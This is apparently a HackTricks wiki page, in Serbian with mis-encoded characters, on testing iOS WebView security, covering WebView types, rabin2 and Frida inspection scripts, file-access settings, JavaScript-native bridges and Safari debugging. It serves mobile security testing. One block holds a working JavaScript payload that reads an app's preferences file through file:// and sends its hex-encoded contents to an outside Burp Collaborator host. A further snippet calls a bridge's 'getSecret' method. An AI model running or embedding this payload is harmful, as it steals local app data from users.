# iOS WebViews

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

Kod ove stranice je izvuÄen [ovde](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md). Proverite stranicu za dalje detalje.


## Tipovi WebViews-a

WebViews se koriste unutar aplikacija kako bi interaktivno prikazivale web sadrÅ¾aj. RazliÄiti tipovi WebViews-a nude razliÄite funkcionalnosti i sigurnosne karakteristike za iOS aplikacije. Evo kratkog pregleda:

- **UIWebView**, koji viÅ¡e nije preporuÄen od iOS 12 zbog nedostatka podrÅ¡ke za onemoguÄ‡avanje **JavaScript**-a, Å¡to ga Äini podloÅ¾nim ubacivanju skripti i napadima **Cross-Site Scripting (XSS)**.

- **WKWebView** je preferirana opcija za ukljuÄivanje web sadrÅ¾aja u aplikacije, nudeÄ‡i unapreÄ‘enu kontrolu nad sadrÅ¾ajem i sigurnosne karakteristike. **JavaScript** je podrazumevano omoguÄ‡en, ali se moÅ¾e onemoguÄ‡iti ako je potrebno. TakoÄ‘e podrÅ¾ava funkcije za spreÄavanje automatskog otvaranja prozora putem JavaScript-a i obezbeÄ‘uje da se sav sadrÅ¾aj uÄitava sigurno. Dodatno, arhitektura **WKWebView**-a minimizira rizik od korupcije memorije koja utiÄe na glavni proces aplikacije.

- **SFSafariViewController** nudi standardizovano iskustvo pregledanja weba unutar aplikacija, prepoznatljivo po svom specifiÄnom izgledu koji ukljuÄuje samo polje za adresu, dugmad za deljenje i navigaciju, i direktnu vezu za otvaranje sadrÅ¾aja u Safari-ju. Za razliku od **WKWebView**-a, **JavaScript** ne moÅ¾e biti onemoguÄ‡en u **SFSafariViewController**-u, koji takoÄ‘e deli kolaÄiÄ‡e i podatke sa Safari-jem, ÄuvajuÄ‡i privatnost korisnika od aplikacije. Moraju biti jasno prikazani u skladu sa smernicama App Store-a.
```javascript
// Example of disabling JavaScript in WKWebView:
WKPreferences *preferences = [[WKPreferences alloc] init];
preferences.javaScriptEnabled = NO;
WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
config.preferences = preferences;
WKWebView *webView = [[WKWebView alloc] initWithFrame:CGRectZero configuration:config];
```
## Pregled konfiguracije WebViews-a

### **Pregled statiÄke analize**

U procesu ispitivanja konfiguracija **WebViews-a**, fokus je na dva osnovna tipa: **UIWebView** i **WKWebView**. Za identifikaciju ovih WebViews-a unutar binarnog fajla, koriste se komande koje traÅ¾e odreÄ‘ene reference klasa i metode inicijalizacije.

- **Identifikacija UIWebView-a**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
```
Ova komanda pomaÅ¾e u pronalaÅ¾enju instanci **UIWebView** pretraÅ¾ivanjem tekstualnih nizova povezanih s njim u binarnom kodu.

- **Identifikacija WKWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
```
SliÄno tome, za **WKWebView**, ovaj komanda pretraÅ¾uje binarni fajl za tekstualne niske koji ukazuju na njegovu upotrebu.

Osim toga, da biste pronaÅ¡li kako je **WKWebView** inicijalizovan, izvrÅ¡ava se sledeÄ‡a komanda, ciljajuÄ‡i na potpis metode koji je povezan sa njegovom inicijalizacijom:
```bash
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
```
#### **Provera konfiguracije JavaScript-a**

Za **WKWebView**, istaknuto je da je najbolja praksa onemoguÄ‡iti JavaScript osim ako nije potrebno. PretraÅ¾uje se kompilirana binarna datoteka da bi se potvrdilo da je svojstvo `javaScriptEnabled` postavljeno na `false`, Äime se osigurava da je JavaScript onemoguÄ‡en:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
```
#### **Samo provera sigurnog sadrÅ¾aja**

**WKWebView** nudi moguÄ‡nost identifikacije problema sa meÅ¡ovitim sadrÅ¾ajem, za razliku od **UIWebView**-a. Ovo se proverava koriÅ¡Ä‡enjem svojstva `hasOnlySecureContent` kako bi se osiguralo da se svi resursi stranice uÄitavaju putem sigurnih veza. Pretraga u kompajliranom binarnom kodu se izvodi na sledeÄ‡i naÄin:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"
```
### **DinamiÄka analiza uvida**

DinamiÄka analiza ukljuÄuje pregledanje hipa za instance WebView-a i njihove osobine. Skripta nazvana `webviews_inspector.js` koristi se u tu svrhu, ciljajuÄ‡i instance `UIWebView`, `WKWebView` i `SFSafariViewController`. Ona beleÅ¾i informacije o pronaÄ‘enim instancama, ukljuÄujuÄ‡i URL-ove i postavke vezane za JavaScript i siguran sadrÅ¾aj.

Pregled hipa moÅ¾e se sprovesti koriÅ¡Ä‡enjem `ObjC.choose()` da bi se identifikovale instance WebView-a i proverile osobine `javaScriptEnabled` i `hasonlysecurecontent`.

{% code title="webviews_inspector.js" %}
```javascript
ObjC.choose(ObjC.classes['UIWebView'], {
onMatch: function (ui) {
console.log('onMatch: ', ui);
console.log('URL: ', ui.request().toString());
},
onComplete: function () {
console.log('done for UIWebView!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});

ObjC.choose(ObjC.classes['SFSafariViewController'], {
onMatch: function (sf) {
console.log('onMatch: ', sf);
},
onComplete: function () {
console.log('done for SFSafariViewController!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
}
});
```
{% endcode %}

Skripta se izvrÅ¡ava sa:
```bash
frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js
```
**KljuÄni rezultati**:
- PronaÄ‘eni su i pregledani instanci WebViews.
- Proverena je omoguÄ‡enost JavaScript-a i postavke sigurnog sadrÅ¾aja.

Ovaj saÅ¾etak obuhvata kljuÄne korake i komande u analizi konfiguracija WebView-a kroz statiÄke i dinamiÄke pristupe, fokusirajuÄ‡i se na sigurnosne funkcije poput omoguÄ‡enosti JavaScript-a i detekcije meÅ¡ovitog sadrÅ¾aja.

## Obrada protokola WebView-a

Obrada sadrÅ¾aja u WebView-ima je kljuÄni aspekt, posebno kada se radi sa razliÄitim protokolima kao Å¡to su `http(s)://`, `file://` i `tel://`. Ovi protokoli omoguÄ‡avaju uÄitavanje i udaljenog i lokalnog sadrÅ¾aja unutar aplikacija. NaglaÅ¡ava se da prilikom uÄitavanja lokalnog sadrÅ¾aja treba preduzeti mere opreza kako bi se spreÄilo da korisnici utiÄu na ime ili putanju datoteke i da ureÄ‘uju sam sadrÅ¾aj.

**WebViews** nude razliÄite metode za uÄitavanje sadrÅ¾aja. Za **UIWebView**, koji je sada zastareo, koriste se metode poput `loadHTMLString:baseURL:` i `loadData:MIMEType:textEncodingName:baseURL:`. Sa druge strane, **WKWebView** koristi `loadHTMLString:baseURL:`, `loadData:MIMEType:textEncodingName:baseURL:` i `loadRequest:` za web sadrÅ¾aj. Metode poput `pathForResource:ofType:`, `URLForResource:withExtension:` i `init(contentsOf:encoding:)` se obiÄno koriste za uÄitavanje lokalnih datoteka. Metoda `loadFileURL:allowingReadAccessToURL:` je posebno znaÄajna zbog svoje sposobnosti da uÄita odreÄ‘eni URL ili direktorijum u WebView, potencijalno izlaÅ¾uÄ‡i osetljive podatke ako je naveden direktorijum.

Da biste pronaÅ¡li ove metode u izvornom kodu ili kompiliranom binarnom fajlu, mogu se koristiti sledeÄ‡e komande:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
```
Å to se tiÄe **pristupa datotekama**, UIWebView to omoguÄ‡ava univerzalno, dok WKWebView uvodi postavke `allowFileAccessFromFileURLs` i `allowUniversalAccessFromFileURLs` za upravljanje pristupom putem URL-ova datoteka, pri Äemu su oba po defaultu postavljena na false.

PruÅ¾en je primer Frida skripte za pregled konfiguracija **WKWebView**-a za sigurnosne postavke:
```bash
ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());
console.log('allowFileAccessFromFileURLs: ',
wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
console.log('allowUniversalAccessFromFileURLs: ',
wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});
```
Na kraju, primer JavaScript payloada koji ima za cilj izvlaÄenje lokalnih fajlova pokazuje potencijalni sigurnosni rizik povezan sa nepravilno konfigurisanim WebViews-om. Ovaj payload enkodira sadrÅ¾aj fajlova u heksadecimalni format pre slanja na server, istiÄuÄ‡i vaÅ¾nost stroge sigurnosne mere u implementaciji WebView-a.
```javascript
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
## Izlaganje nativnih metoda putem WebView-a

## Razumevanje nativnih interfejsa WebView-a u iOS-u

Od iOS 7 nadalje, Apple je pruÅ¾io API-je za **komunikaciju izmeÄ‘u JavaScript-a u WebView-u i nativnih** Swift ili Objective-C objekata. Ova integracija se uglavnom olakÅ¡ava kroz dve metode:

- **JSContext**: JavaScript funkcija se automatski kreira kada se Swift ili Objective-C blok poveÅ¾e sa identifikatorom unutar `JSContext`-a. Ovo omoguÄ‡ava besprekornu integraciju i komunikaciju izmeÄ‘u JavaScript-a i nativnog koda.
- **JSExport protokol**: NasleÄ‘ivanjem `JSExport` protokola, nativna svojstva, instance metode i klase metode mogu biti izloÅ¾ene JavaScript-u. Ovo znaÄi da se bilo koje promene napravljene u JavaScript okruÅ¾enju ogledaju u nativnom okruÅ¾enju, i obrnuto. MeÄ‘utim, vaÅ¾no je osigurati da osetljivi podaci ne budu nenamerno izloÅ¾eni putem ove metode.

### Pristupanje `JSContext`-u u Objective-C-u

U Objective-C-u, `JSContext` za `UIWebView` moÅ¾e se dobiti sledeÄ‡im kodom:
```objc
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```
### Komunikacija sa `WKWebView`

Za `WKWebView`, direktni pristup `JSContext`-u nije dostupan. Umesto toga, koristi se prenos poruka putem funkcije `postMessage`, omoguÄ‡avajuÄ‡i JavaScript-u da komunicira sa nativnom aplikacijom. Handleri za ove poruke se podeÅ¡avaju na sledeÄ‡i naÄin, omoguÄ‡avajuÄ‡i JavaScript-u da sigurno interaguje sa nativnom aplikacijom:
```swift
func enableJavaScriptBridge(_ enabled: Bool) {
options_dict["javaScriptBridge"]?.value = enabled
let userContentController = wkWebViewConfiguration.userContentController
userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

if enabled {
let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
}
}
```
### Interakcija i testiranje

JavaScript moÅ¾e da komunicira sa nativnim slojem definisanjem handlera za poruke skripte. Ovo omoguÄ‡ava operacije poput pozivanja nativnih funkcija sa veb stranice:
```javascript
function invokeNativeOperation() {
value1 = document.getElementById("value1").value
value2 = document.getElementById("value2").value
window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers", value1, value2]);
}

// Alternative method for calling exposed JavaScript functions
document.location = "javascriptbridge://addNumbers/" + 1 + "/" + 2
```
Da biste uhvatili i manipulisali rezultatom poziva native funkcije, moÅ¾ete prebrisati callback funkciju unutar HTML-a:
```html
<html>
<script>
document.location = "javascriptbridge://getSecret"
function javascriptBridgeCallBack(name, result) {
alert(result);
}
</script>
</html>
```
Nativna strana obraÄ‘uje JavaScript poziv kao Å¡to je prikazano u klasi `JavaScriptBridgeMessageHandler`, gde se rezultat operacija kao Å¡to je mnoÅ¾enje brojeva obraÄ‘uje i Å¡alje nazad JavaScript-u radi prikaza ili dalje manipulacije:
```swift
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {
// Handling "multiplyNumbers" operation
case "multiplyNumbers":
let arg1 = Double(messageArray[1])!
let arg2 = Double(messageArray[2])!
result = String(arg1 * arg2)
// Callback to JavaScript
let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
}
```
## Debugiranje iOS WebViews

(Tutorijal zasnovan na [https://blog.vuplex.com/debugging-webviews](https://blog.vuplex.com/debugging-webviews))

Da biste efikasno debugirali web sadrÅ¾aj unutar iOS webview-ova, potrebna je odreÄ‘ena konfiguracija koja ukljuÄuje Safari-jeve alate za razvoj zbog Äinjenice da poruke poslate putem `console.log()` nisu prikazane u Xcode logovima. Evo pojednostavljenog vodiÄa koji naglaÅ¡ava kljuÄne korake i zahteve:

- **Priprema na iOS ureÄ‘aju**: Safari Web Inspector treba biti aktiviran na vaÅ¡em iOS ureÄ‘aju. To se postiÅ¾e odlaskom na **PodeÅ¡avanja > Safari > Napredno**, i omoguÄ‡avanjem _Web Inspector_-a.

- **Priprema na macOS ureÄ‘aju**: Na vaÅ¡em macOS razvojnom raÄunaru, morate omoguÄ‡iti alate za razvoj unutar Safari-ja. Pokrenite Safari, pristupite **Safari > Preferences > Advanced**, i izaberite opciju _Show Develop menu_.

- **Povezivanje i debugiranje**: Nakon Å¡to poveÅ¾ete svoj iOS ureÄ‘aj sa svojim macOS raÄunarom i pokrenete aplikaciju, koristite Safari na svom macOS ureÄ‘aju da biste izabrali webview koji Å¾elite da debugirate. Idite na _Develop_ u Safari-jevoj traci sa menijem, preÄ‘ite miÅ¡em preko imena vaÅ¡eg iOS ureÄ‘aja da biste videli listu instanci webview-a, i izaberite instancu koju Å¾elite da pregledate. Otvara se novi prozor Safari Web Inspector-a u tu svrhu.

MeÄ‘utim, budite svesni ograniÄenja:

- Debugiranje ovom metodom zahteva macOS ureÄ‘aj jer se oslanja na Safari.
- Samo webview-ovi u aplikacijama uÄitanim na vaÅ¡ ureÄ‘aj putem Xcode-a su pogodni za debugiranje. Webview-ovi u aplikacijama instaliranim putem App Store-a ili Apple Configurator-a ne mogu se debugirati na ovaj naÄin.


## Reference

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6)
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju oglaÅ¡enu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
